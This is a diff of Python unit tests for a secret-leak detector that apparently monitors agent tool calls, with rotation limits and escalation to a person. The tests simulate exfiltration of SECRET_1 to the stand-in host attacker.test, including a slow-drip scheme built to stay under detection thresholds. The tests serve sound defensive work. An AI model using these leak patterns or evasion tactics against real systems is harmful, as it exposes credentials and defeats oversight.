@@ -332,3 +332,136 @@ def test_rotation_updates_dag_value():
     new_sink = s.http(f"http://attacker.test/?k={new[:12]}")
     d.decide(new_sink)
     assert "SECRET_1" in d.dag.nodes[new_sink.id].S
+
+
+# --- #79: invariante, exposición y límite de rotaciones -----------------------
+
+import random as _random  # noqa: E402
+
+
+def _slow_drip_max_bits(params: Params, check: bool, n_calls: int = 1500) -> float:
+    """k − 1 = 7 caracteres del secreto vigente cada W + 1 = 51 llamadas; tras cada rotación se
+    relee el secreto (el atacante sigue con el valor nuevo). Devuelve el máximo de bits verdaderos
+    de una misma versión del secreto que salieron antes de que rotara."""
+    d, s = Detector(params=params, check_params=check), Session()
+    d.decide(s.read_env())
+    value = d.bits._s["SECRET_1"].value
+    sent: set[int] = set()
+    worst, pos = 0, 0
+    for i in range(1, n_calls):
+        if i % 51 == 0:
+            frag = value[pos:pos + 7]
+            d.decide(s.http(f"http://attacker.test/?q={frag}"))
+            sent.update(range(pos, pos + 7))
+            pos = (pos + 7) % 33
+        else:
+            d.decide(s.read_doc())
+        worst = max(worst, 4 * len(sent))
+        new_value = d.bits._s["SECRET_1"].value
+        if new_value != value:                 # rotó: lo enviado de la versión vieja ya no sirve
+            value, sent, pos = new_value, set(), 0
+            d.decide(s.read_env())             # relectura del secreto
+    return worst
+
+
+def test_slow_drip_bounded_by_invariant():
+    p = Params()
+    assert _slow_drip_max_bits(p, check=True) <= 160 - p.beta_bits
+
+
+def test_slow_drip_exceeds_without_invariant():
+    """Documenta por qué existe la invariante: con T=200 el mismo envío supera H − beta_bits."""
+    p = Params(T=200)
+    assert _slow_drip_max_bits(p, check=False) > 160 - p.beta_bits
+
+
+def _hash_sink(s, rnd):
+    hashes = " ".join("".join(rnd.choice("0123456789abcdef") for _ in range(40)) for _ in range(50))
+    return s.http("http://attacker.test/commits", body=hashes)
+
+
+def test_many_hashes_unexposed_never_rotates():
+    d, s, rnd = Detector(), Session(), _random.Random(79)
+    acts = [d.decide(_hash_sink(s, rnd)).action for _ in range(200)]
+    assert not any(a.startswith("rotate") for a in acts)
+
+
+def test_many_hashes_exposed_does_not_break():
+    d, s, rnd = Detector(), Session(), _random.Random(79)
+    d.decide(s.read_env())
+    decs = [d.decide(_hash_sink(s, rnd)) for _ in range(200)]
+    assert len(decs) == 200 and all(x.action in ("allow", "rotate+allow", "block", "rotate+block") for x in decs)
+
+
+def test_exposure_by_content():
+    d, s = Detector(), Session()
+    c = s._mk("read_file", {"path": "notas.txt"}, ["notas.txt"], output=f"la clave es {S1} ok")
+    d.decide(c)
+    assert d.exposed["SECRET_1"] is True and d.first_read["SECRET_1"] == c.id
+    d2, s2 = Detector(), Session()
+    c2 = s2._mk("read_file", {"path": "notas.txt"}, ["notas.txt"], output=None)
+    d2.decide(c2)
+    assert d2.exposed["SECRET_1"] is False
+    d2.set_output(c2.id, f"x {S1[5:15]} y")          # en vivo, la salida llega después
+    assert d2.exposed["SECRET_1"] is True
+
+
+def test_fraction_rotation_requires_exposure():
+    d, s = Detector(), Session()                     # sin leer .env
+    decs = [d.decide(s.http(f"http://attacker.test/?q={S1[4 * i:4 * i + 4]}")) for i in range(4)]
+    assert all(x.action == "allow" for x in decs)
+    assert decs[-1].leak["SECRET_1"].bits >= 48       # las candidatas se siguen mostrando
+
+
+def test_rotation_limit_escalates():
+    d, s = Detector(), Session()
+    acts, reasons = [], []
+    for _ in range(4):                               # cuatro pedidos de rotación en < 100 llamadas
+        d.decide(s.read_env())
+        for _ in range(5):
+            d.decide(s.read_doc())
+        value = d.bits._s["SECRET_1"].value
+        dec = d.decide(s.http(f"http://attacker.test/?k={value}"))
+        acts.append(dec.action)
+        reasons.append(dec.reason)
+    assert acts[:3] == ["rotate+block"] * 3
+    assert acts[3] == "block" and "Demasiadas rotaciones de SECRET_1" in reasons[3]
+    assert d.escalated["SECRET_1"] is True
+    nxt = d.decide(s.http("http://attacker.test/ping"))
+    assert nxt.action == "block" and "se avisa a una persona" in nxt.reason
+    assert d.decide(s.read_doc()).action == "allow"   # las lecturas siguen permitidas
+    assert d.decide(s.http("http://api.empresa.test/deploy", body="hola")).action == "allow"  # host permitido
+
+
+def test_escalation_persists_while_compromised():
+    """Si el secreto filtrado no se puede rotar, sigue pidiendo rotación: el modo escalado no termina."""
+    d, s = Detector(params=Params(rotation_window=30)), Session()
+    for _ in range(4):
+        d.decide(s.read_env())
+        value = d.bits._s["SECRET_1"].value
+        d.decide(s.http(f"http://attacker.test/?k={value}"))
+    assert d.escalated["SECRET_1"] is True
+    for _ in range(40):
+        d.decide(s.read_doc())
+    assert d.escalated["SECRET_1"] is True
+
+
+class _SwitchModel:
+    def __init__(self, v):
+        self.v = v
+
+    def llr(self, f):
+        return self.v
+
+
+def test_escalation_ends_after_window_without_requests():
+    model = _SwitchModel(3.0)
+    d, s = Detector(model=model, params=Params(rotation_window=30)), Session()
+    acts = [d.decide(s.read_env()).action for _ in range(5)]   # S = 3, 6, 9, 12, 15
+    assert acts == ["allow", "rotate+allow", "rotate+allow", "rotate+allow", "allow"]
+    assert d.escalated["SECRET_1"] is True                    # 4.º pedido: no rota, escala
+    model.v = -3.0                                            # la evidencia baja: S < b_rot desde la 4.ª llamada
+    for _ in range(35):
+        d.decide(s.read_doc())
+    assert d.escalated["SECRET_1"] is False
+    assert d.decide(s.http("http://attacker.test/ping")).action == "allow"
